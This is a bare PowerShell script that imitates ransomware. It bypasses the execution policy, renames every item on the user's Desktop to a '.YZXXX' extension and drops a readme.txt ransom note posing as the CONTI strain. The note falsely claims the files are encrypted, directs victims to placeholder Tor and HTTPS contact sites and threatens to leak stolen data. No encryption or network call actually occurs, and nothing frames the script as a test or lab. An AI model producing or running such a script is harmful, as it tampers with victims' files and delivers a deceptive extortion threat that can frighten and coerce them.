Set-ExecutionPolicy Bypass

Get-ChildItem $env:USERPROFILE\Desktop | Rename-Item -NewName {[System.IO.Path]::ChangeExtension($_.Name, ".YZXXX")}

$DesktopPath = [Environment]::GetFolderPath("Desktop")

Set-Content $DesktopPath\readme.txt "All off your files are currently encrypted by CONTI strain.

As you know (if you don't - just google it), all of the data that has been encrypted by our software cannot be recovered by any means without contacting our team directly.
If you try to use any additional recovery software - the files might be damaged, so if you are willing to try - try it on the data of the lowest value.

To make sure that we REALLY CAN get your data back - we offer you to decrypt 2 random files completely free of charge.

You can contact our team directly for further instructions through our website :

TOR VERSION :
(you should download and install TOR browser first https://torproject.org)

http://contileaks

HTTPS VERSION :
https://contileaks

YOU SHOULD BE AWARE!
Just in case, if you try to ignore us. We've downloaded a pack of your internal data and are ready to publish it our our news website if you do not respond. So it will be better for both sides if you contact us as soon as possible.

`-`-`-BEGIN ID`-`-`-
CIbCVao8f2mtjWpRbsVCpHdGJxNQCL32Mz0AdfW9eTEjIyhYIbXjov5wym4j
`-`-`-END ID`-`-`-"
